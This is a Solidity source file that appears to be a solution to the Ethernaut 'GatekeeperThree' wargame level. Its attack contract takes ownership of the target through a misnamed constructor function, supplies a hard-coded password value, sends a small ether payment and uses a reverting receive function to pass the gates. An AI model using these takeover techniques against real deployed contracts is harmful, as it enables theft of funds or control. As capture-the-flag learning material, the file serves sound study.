// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract HackGateKeeperThree {

    // Set payable address before creating the instance.
    address payable gp = payable(0x5EAD81A283DDf57a946FBdDaB93349848ec2a3cA);
    GatekeeperThree gk3 = GatekeeperThree(gp);

    constructor() payable {}

    function hack() payable public {
        
        gk3.construct0r();

        gk3.getAllowance(uint(0x000000000000000000000000000000000000000000000000000000006553abf8));

        // Transfer to the address
        gp.transfer(0.0011 ether);

        gk3.enter();
    }

    receive() external payable {
            revert();
    }
}

contract GatekeeperThree {
    function enter() public {}
    function getAllowance(uint _password) public {}
    function construct0r() public {}
}